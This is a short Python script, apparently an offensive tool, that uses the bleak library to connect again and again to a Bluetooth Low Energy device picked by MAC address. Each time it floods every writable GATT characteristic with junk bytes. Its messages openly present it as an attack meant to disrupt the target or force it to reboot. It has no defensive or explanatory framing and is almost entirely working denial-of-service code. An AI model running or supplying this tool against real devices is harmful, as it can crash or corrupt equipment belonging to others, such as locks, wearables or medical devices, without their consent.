import asyncio
from bleak import BleakClient

async def start_protocol_interference(target_mac):
    print(f"[!] Target Acquired: {target_mac}")
    junk_payload = bytearray([0xFF] * 20) # 20 bytes of "noise"
    
    while True:
        try:
            async with BleakClient(target_mac, timeout=5.0) as client:
                print(f"[+] Connected. Flooding GATT characteristics...")
                services = client.services
                for service in services:
                    for char in service.characteristics:
                        if "write" in char.properties:
                            # 'response=False' makes the flood much faster
                            await client.write_gatt_char(char.uuid, junk_payload, response=False)
                
                print("[*] Packet burst sent. Cycling connection...")
                await asyncio.sleep(0.2) # Avoid crashing your own BT driver
                
        except Exception as e:
            print("[-] Target signal disrupted or device rebooting. Retrying...")
            await asyncio.sleep(1)